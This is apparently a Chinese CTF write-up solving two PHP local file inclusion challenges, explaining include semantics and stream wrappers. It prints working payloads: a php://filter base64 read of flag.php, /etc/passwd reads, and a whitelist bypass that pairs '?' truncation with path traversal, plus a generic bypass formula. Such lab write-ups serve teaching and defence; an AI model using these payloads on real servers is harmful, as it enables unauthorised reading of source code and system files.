---
title: "文件包含（LFI）两题 题解"
date: 2026-11-08
pinned: false
description: "include 的本质+白名单绕过 + 路径穿越"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-12-qwen.jpg
---

# 文件包含（LFI）两题 Writeup

| 项目 | 题一 | 题二 |
|---|---|---|
| 地址 | `937ba0b47ea4bd937506d8b9.http-ctf2.dasctf.com` | `82471751e7fcfde408bd3123.http-ctf2.dasctf.com` |
| 环境 | openresty + PHP/7.3.13 | openresty + PHP/5.6.36 |
| 入口 | `?file=` | `?file=` |
| 防护 | **无过滤** | **白名单 + 截断检查** |
| 核心障碍 | php 文件被解析执行 | 任意路径被白名单拒绝 |
| 解法 | `php://filter` + base64 | `?` 截断 + 路径穿越 |
| 考点 | 流包装器 | 检查与使用不一致 / 路径规范化 |
| Flag | `CTF2{fe966466-067b-441b-ab9e-967f78c27225}` | `CTF2{6d8e40f8-f3eb-4c12-b1a9-2296c4d86acb}` |
| 解题日期 | 2026-11-06 | 2026-11-06 |

---

# 第一部分 · 知识点

## 1.1 include 的本质：解析执行，不是读文件

这是整个 LFI 方向的地基。

**`include` / `require` 把目标文件当 PHP 代码解析执行，不是把内容读出来给你看。**

| 被包含的文件 | 实际发生什么 | 页面上能看到什么 |
|---|---|---|
| `x.txt`（纯文本，无 `<?php`） | 原样输出 | 全部内容 |
| `x.php`（`<?php $a='flag'; ?>`） | 当代码执行，标签内不输出 | **空白** |
| `flag.php`（`<?php echo "hi"; //flag{...}`） | 执行，只输出 `hi` | `hi`，flag 不见 |

所以「包含 flag.php 后一片空白 / 只有一句提示」不是失败，是 `include` 的正常语义。

**由此推出 LFI 的第一分水岭：我要的是「文件里的字符」，还是「让文件里的代码跑起来」？**

本题两题都属于「要字符」，所以核心都是**让内容在交给 PHP 解释器之前，先变成它不认识的东西**。

## 1.2 LFI 的三条能力方向

| 方向 | 目的 | 依赖 |
|---|---|---|
| **读文件内容** | 拿到 `.php` 的源码 | 能把内容当「数据」而非「代码」交出来 |
| **执行代码** | 让服务器跑我给的 PHP/命令 | 输入能变成可执行内容 |
| **写文件再包含** | 先落地文件，再 include | 有可控写入点（日志 / session / 上传 / 临时文件） |

## 1.3 PHP 流包装器表

`include` 的参数不一定是路径，PHP 会按协议前缀匹配包装器。

| 包装器 | 能力 | 限制 |
|---|---|---|
| `php://filter` | 对数据流做**过滤器链**处理后再交给 include | 通常**不受** `allow_url_include` 限制，CTF 最常用 |
| `php://input` | 读 POST body 当文件内容 | 受 `allow_url_include`，默认 Off |
| `data://` | 内联数据当文件（可塞 PHP 代码） | 受 `allow_url_include`，默认 Off |
| `phar://` | 访问 phar 归档内文件 | 需能上传 phar；可能触发反序列化 |
| `zip://` / `compress.zlib://` | 读压缩包内成员 | 前提是能上传压缩包 |
| `file://` | 本地文件 | 等价于直接写路径 |
| `expect://` | 直接执行命令 | 需 expect 扩展，现实中几乎没有 |

`php://filter` 的语法结构：

```
php://filter/<过滤器链>/resource=<目标文件>
①协议              ②可替换可叠加        ③固定写法
```

**真正要记的只有两个词：`php://filter` 和 `resource=`**，中间那截按规律现场拼。

## 1.4 过滤器命名规律（不用背）

| 规律 | 例子 |
|---|---|
| 成对出现，后缀 `-encode` / `-decode` | `convert.base64-encode` / `convert.base64-decode` |
| `convert.` 是转换类命名空间 | `convert.quoted-printable-encode` |
| `string.` 字符串类，看名字就懂 | `string.toupper` / `string.strip_tags` |
| `iconv.` 编码转换，格式 `iconv.<源>.<目标>` | `convert.iconv.utf-8.utf-16` |

| 类别 | 内容 |
|---|---|
| 值得背（3 个） | `php://filter`、`php://input`、`data://` |
| 值得记结构 | `php://filter/<过滤器>/resource=<文件>` |
| 现场查手册 | 具体过滤器名、`iconv` 组合 |
| 绝不要背 | **filter chain**（几十个 `convert.iconv` 串联）—— 那是工具生成的 |

## 1.5 为什么 base64 能绕过「被解析」

`include` 会把文件当代码解析。base64 编码后，内容变成 `PD9waHAg...` 这种纯字母数字：

- 里面**不再有 `<?php` 标记**，解释器认不出来，只能原样吐出
- 纯 ASCII，二进制内容也不会把响应搞乱
- 可逆，解码即得原文

同理，`convert.iconv`、`quoted-printable` 这些过滤器目的一样：**把内容变得不像代码**。

---

# 第二部分 · 题一：php://filter 读源码

## 2.1 侦察

首页只给了一个链接：

```html
<a href="?file=flag.php">tips</a>
```

参数名 `file`，值直接是 `flag.php` —— 参数形态 + PHP 后端，锁定 `include($_GET['file'])`。

本题**未暴露源码**，以下结论由行为推断：

| 请求 | 返回 | 推出 |
|---|---|---|
| `?file=flag.php` | `Can you find out the flag?` | 文件被当代码执行，只 echo 了这一句 |
| `?file=/etc/passwd` | 完整文件内容 | **无路径过滤**，支持绝对路径 |

两个现象放在一起，结论非常干净：

```
/etc/passwd → 能看（纯文本，没有 <?php）
flag.php    → 只有一句提示（它是 PHP，被解析执行了）
```

**同样的 include，唯一差别就是文件里有没有 `<?php`。**

## 2.2 原理

| 环节 | 发生什么 |
|---|---|
| `include "flag.php"` | PHP 读取文件 → 交给 Zend 解析 → 执行 → 只有 `echo` 的内容进响应 |
| 文件里的 `//CTF2{...}` 注释 | 被解释器丢弃，永远不会出现在页面上 |
| `include "php://filter/convert.base64-encode/resource=flag.php"` | 先编码成 Base64，再作为「输出」交出来，**不进入解析阶段** |

关键点：`php://filter` 让 include **不再是「执行文件」而是「输出数据流」**，这是同一个函数的两种用法。

## 2.3 Payload

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

响应（混在页面自带 HTML 里）：

```
<meta charset="utf8">
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL0NURjJ7ZmU5NjY0NjYtMDY3Yi00NDFiLWFiOWUtOTY3Zjc4YzI3MjI1fQo=
```

Base64 解码后拿到 `flag.php` 的真实源码：

```php
<?php
echo "Can you find out the flag?";
//CTF2{fe966466-067b-441b-ab9e-967f78c27225}
```

## 2.4 踩坑记录

| 坑 | 现象 | 处理 |
|---|---|---|
| 响应开头有 `<meta charset="utf8">` | 直接全选 Base64 解码失败 / 乱码 | 只取中间那段纯字母行再解码 |
| flag 在**注释**里 | 页面永远不显示 | 必须读源码，不能指望执行结果 |
| 用浏览器地址栏 | 正常，本题 payload 无 `?`/`#` 问题 | 但含 `?` `#` 的 payload 必须走 Burp/curl |

---

# 第三部分 · 题二：白名单绕过 + 路径穿越

## 3.1 侦察

首页只有一个 HTML 注释：

```html
<!--source.php-->
```

访问 `?file=source.php` 拿到判卷规则：

```php
$whitelist = ["source"=>"source.php", "hint"=>"hint.php"];

if (in_array($page, $whitelist)) return true;

$_page = mb_substr($page, 0, mb_strpos($page . '?', '?'));
if (in_array($_page, $whitelist)) return true;

$_page = urldecode($page);
$_page = mb_substr($_page, 0, mb_strpos($_page . '?', '?'));
if (in_array($_page, $whitelist)) return true;

echo "you can't see it";
return false;
```

调用处：

```php
if (!empty($_REQUEST['file']) && is_string($_REQUEST['file']) && emmm::checkFile($_REQUEST['file'])) {
    include $_REQUEST['file'];   // ← 用的是原值
    exit;
}
```

`?file=hint.php` 给出目标：

```
flag not here, and flag in ffffllllaaaagggg
```

## 3.2 三段检查翻译成人话

| 检查 | 看的是哪个值 | 通过条件 |
|---|---|---|
| ① | 原始 `$page` 整体 | 完全等于 `source.php` / `hint.php` |
| ② | `$page` 中第一个 `?` 之前 | 等于白名单名 |
| ③ | 先 `urldecode`，再取第一个 `?` 之前 | 等于白名单名 |

## 3.3 漏洞本质：检查与使用不一致

```php
emmm::checkFile($_REQUEST['file']);  // 检查的是「截断后的值」
include $_REQUEST['file'];           // 执行的是「原始完整字符串」
```

**检查的对象 ≠ 执行的对象**，白名单在逻辑上被架空。

`?` 成了分界线：

| 位置 | 谁在看 | 内容要求 |
|---|---|---|
| `?` 左边 | `checkFile` | 必须是 `hint.php` 或 `source.php` |
| `?` 右边 | `include` → 文件系统 | 随便写，检查函数不看 |

一个字符串，两副面孔。

## 3.4 路径穿越原理

`?` 后面必须紧跟 `/`，让 `hint.php?` 成为一个**目录段**：

| 写法 | 结果 |
|---|---|
| `hint.php?/../../../../etc/passwd` | ✅ 能读到 |
| `hint.php?../../../../etc/passwd` | ❌ 空白（`hint.php?..` 粘成一个文件名，`..` 失效） |

**路径是纯字符串计算的，`..` 的回退不检查目录是否真实存在。**

```
/var/www/html/hint.php?     ← 假设 "hint.php?" 是个目录（其实不存在）
                    ↓ ..
/var/www/html
                    ↓ ..
/var/www
                    ↓ ..
/var
                    ↓ ..
/
                    ↓ 接上目标名
/ffffllllaaaagggg
```

`a/..` 在计算上等于「空」，所以 `hint.php?` 被干净抵消 —— **它只负责骗检查，不参与真实文件访问**。

层数：脚本在 `/var/www/html/`，回到 `/` 需 4 层（`html → www → var → /`）。**多写无害**，到根后 `..` 还是 `/`。

## 3.5 Payload

```
?file=hint.php?/../../../../ffffllllaaaagggg
        └─骗检查─┘└──── 路径穿越 ────┘└─目标─┘
```

响应末尾（317 字节）：

```
<!--source.php-->

CTF2{6d8e40f8-f3eb-4c12-b1a9-2296c4d86acb}
```

## 3.6 三态判读表（这题全靠它）

| 页面返回 | 卡在哪 | 检查是否通过 |
|---|---|---|
| `you can't see it` | `checkFile` | ❌ 字符串构造错了 |
| **空白** | `include` | ✅ 通过，但路径指不到文件 |
| 有内容 | 成功 | ✅ |

注意本题 `display_errors=Off`，`include` 失败**不会**打印 `failed to open stream`，只能靠这个三态表判断。

## 3.7 踩坑记录

| 坑 | 现象 | 原因 / 处理 |
|---|---|---|
| `..` 打成 `...` | 一直空白 | 路径只认**恰好两个点**；`...` 是个普通目录名，无回退语义 |
| 浏览器地址栏发送 | 空白 | 浏览器可能把第二个 `?` 编码成 `%3F`；`checkFile` 第三段 `urldecode` 仍放行，但 `include` 拿到字面 `%3F` → 文件不存在 |
| Burp 发送 | 274 字节（失败） | 请求行显示与实发不一致，改用 `curl.exe` 复核才拿到 317 字节 |
| 层数判断 | — | 用 `hint.php?/../../../../etc/passwd` 先验证路径形态是否通，4 层即到达根 |

---

# 第四部分 · 两题对比

| 维度 | 题一 | 题二 |
|---|---|---|
| PHP 版本 | 7.3.13 | 5.6.36 |
| 输入过滤 | 完全无 | 白名单 + `?` 截断 + `urldecode` |
| 卡点位置 | 「怎么读」 | 「怎么过检查」 |
| 核心手法 | 流包装器（数据流编码） | 逻辑缺陷（检查≠使用）+ 路径规范化 |
| payload 特征 | 长、含 `php://filter` | 短、含 `?` 与 `../` |
| 依赖条件 | 无需过滤、可绝对路径 | 需白名单函数存在截断逻辑 |
| 判读信号 | 有无 Base64 串 | `you can't see it` / 空白 / 有内容 |
| 共同点 | 都是 `include($_GET['file'])`，都在 `/` 或网站目录读文件 | 同左 |

**一句话区分：**

- 题一是**「函数用法」问题** —— include 会执行，我换个方式让它不执行。
- 题二是**「代码逻辑」问题** —— 检查函数看的是 A，执行时用的是 B。

---

# 第五部分 · 方法论

## 5.1 拿到 LFI 题的四问

| # | 问题 | 决定什么 |
|---|---|---|
| 1 | 能否读绝对路径（`/etc/passwd`）？ | 无过滤？还是被拼了前缀？ |
| 2 | 目标文件是「纯文本」还是「PHP」？ | 要读源码，还是要执行结果 |
| 3 | `allow_url_include` 开没开？ | 「执行代码」那条路能不能走 |
| 4 | 有没有可控写入点？ | 「写文件再包含」是否可行 |

## 5.2 命令/代码能执行但没输出时，按顺序想

| 顺序 | 思路 | 手法 |
|---|---|---|
| 1 | 让包装器处理输出 | `php://filter` + 编码 |
| 2 | 断开拼接的后缀 | `;#` 注释、`%0A` 换行（题一之前的 RCE 题） |
| 3 | 写文件再读 | 日志 / session / 临时文件 |
| 4 | 带外传出 | curl / DNSLog |

## 5.3 工具层坑（真实渗透高频）

| 现象 | 排查 |
|---|---|
| payload 正确但一直失败 | 用 `curl.exe` 复核，别信浏览器和 Repeater 的显示 |
| `?` `#` `%` 在 URL 里 | 浏览器会编码，Burp 版本差异也会改字节 |
| 编码后反而「检查过但文件找不到」 | 说明某处对**原值**做了操作，而对**解码值**做检查（题二的第三段就是活例子） |
| 报错被吞 | `display_errors=Off` 时用「三态判读」推断 |

## 5.4 通用公式：白名单 + 路径穿越

```
<白名单文件名> ? / (../ × N) <目标文件相对根的路径>
      ↑骗检查        ↑变目录  ↑回退层数    ↑真正要读的
```

变化点只有三个：白名单名、层数 N、目标路径，剩下都固定。

---

# 第六部分 · 汇总表

| 项目 | 内容 |
|---|---|
| 题一考点 | `include` 把 php 当代码执行 → `php://filter` 把内容变数据 |
| 题一 payload | `?file=php://filter/convert.base64-encode/resource=flag.php` |
| 题一 flag | `CTF2{fe966466-067b-441b-ab9e-967f78c27225}`（藏在**注释**里） |
| 题二考点 | `checkFile` 检查截断值、`include` 用原值 → 检查与使用不一致 |
| 题二 payload | `?file=hint.php?/../../../../ffffllllaaaagggg` |
| 题二 flag | `CTF2{6d8e40f8-f3eb-4c12-b1a9-2296c4d86acb}` |
| 题二三态 | `you can't see it`=检查拒 / 空白=路径错 / 有内容=成功 |
| 必背三词 | `php://filter`、`resource=`、`php://input` |
| 必记结构 | `php://filter/<过滤器>/resource=<文件>` |
| 关键认知 | `a/..` 是字符串运算，假目录可被抵消 |
| 关键认知 | 检查的值 ≠ 使用的值，是白名单类漏洞的通用突破口 |
| 工具教训 | `..` 不能写成 `...`；用 curl 复核；浏览器/Burp 可能改字节 |
